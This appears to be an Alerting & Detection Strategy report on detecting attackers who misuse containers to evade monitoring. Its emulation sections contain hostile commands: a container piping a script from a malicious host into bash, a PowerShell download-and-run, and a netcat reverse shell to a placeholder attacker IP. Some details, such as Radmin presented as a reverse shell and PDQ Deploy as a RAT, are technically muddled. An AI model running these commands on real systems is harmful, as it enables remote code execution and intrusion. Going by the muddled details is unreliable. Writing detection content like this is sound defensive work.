# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Use of Containers to Bypass Security Monitoring

## Goal
The goal of this detection strategy is to identify and mitigate adversarial attempts to bypass security monitoring systems using containers.

## Categorization
- **MITRE ATT&CK Mapping:** T1072 - Software Deployment Tools
- **Tactic / Kill Chain Phases:** Execution, Lateral Movement
- **Platforms:** Linux, macOS, Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1072)

## Strategy Abstract
This detection strategy leverages a combination of endpoint monitoring and network traffic analysis to detect anomalous container activity that may indicate adversarial behavior. Key data sources include:
- **Endpoint Logs:** Collects logs from container engines (e.g., Docker, Kubernetes) for suspicious activities.
- **Network Traffic:** Analyzes unusual network patterns or connections initiated by containers.

Patterns analyzed include:
- Unexpected spikes in resource usage indicating possible hidden processes within containers.
- Unusual communication between containers and external IP addresses.
- Execution of uncommon binaries or scripts within container environments.

## Technical Context
Adversaries may use containers to deploy malicious payloads while bypassing traditional security measures. They exploit the lightweight and isolated nature of containers for stealthy execution and movement across networks.

### Adversary Emulation Details
Sample commands used by adversaries:
```bash
# Launch a hidden container with suspicious activity
docker run --rm -d --name adversary_container ubuntu:latest /bin/bash -c "curl http://malicious-site.com/script.sh | bash"

# Deploy network tools within the container to establish C2 communications
apt-get update && apt-get install net-tools -y && nc -lvp 4444
```

## Blind Spots and Assumptions
- **Blind Spots:**
  - Detection may miss sophisticated adversaries who use legitimate services inside containers.
  - Container escape techniques might not be fully covered if they exploit zero-day vulnerabilities.

- **Assumptions:**
  - Assumes baseline knowledge of normal container usage patterns within the organization.
  - Requires integration with existing logging and network monitoring tools for full efficacy.

## False Positives
Potential benign activities that could trigger false alerts include:
- Legitimate software development processes involving frequent deployment of containers.
- Routine updates or patches applied through automated scripts that may mimic adversarial behaviors.

## Priority
**Priority: High**

Justification:
- Containers are increasingly used in modern infrastructure, presenting a significant attack surface.
- The stealthy nature of container-based attacks can lead to undetected persistence and lateral movement within an environment.

## Validation (Adversary Emulation)
To validate this detection strategy, the following steps can be emulated in a test environment:

1. **Radmin Viewer Utility**
   - Deploy Radmin as a reverse shell from within a container to establish C2 communication.
   ```bash
   # Install Radmin on Windows
   powershell -Command "Invoke-WebRequest -Uri http://example.com/radmin_installer.exe -OutFile .\radmin_installer.exe; Start-Process .\radmin_installer.exe"
   
   # Execute the reverse shell script within a container
   docker run --rm -it windows:latest powershell -Command "Start-Process 'radmin'; nc -e cmd.exe <attacker_ip> 4444"
   ```

2. **PDQ Deploy RAT**
   - Use PDQ Deploy to deploy scripts or executables inside containers.
   ```bash
   # Install PDQ Deploy and execute a script from within the container
   docker run --rm -it windows:latest powershell -Command "Start-Process 'pdqdeploy'; .\scripts\malicious_script.ps1"
   ```

3. **Deploy 7-Zip Using Chocolatey**
   - Package and deploy malicious binaries using 7-Zip and Chocolatey.
   ```bash
   # Install 7-Zip in a container using Chocolatey
   docker run --rm -it windows:latest powershell -Command "choco install 7zip; Expand-Archive .\malicious.zip -DestinationPath C:\malicious_folder"
   ```

## Response
When an alert is triggered, analysts should:
1. **Verify the Container:** Confirm if the container's behavior aligns with known malicious indicators.
2. **Isolate and Contain:** Immediately isolate affected containers to prevent lateral movement.
3. **Investigate Logs:** Review logs for additional clues or evidence of compromise.
4. **Remediate:** Remove any identified threats and apply patches to prevent recurrence.

## Additional Resources
Additional references and context are not available at this time. Further research into container security best practices is recommended to enhance detection capabilities.
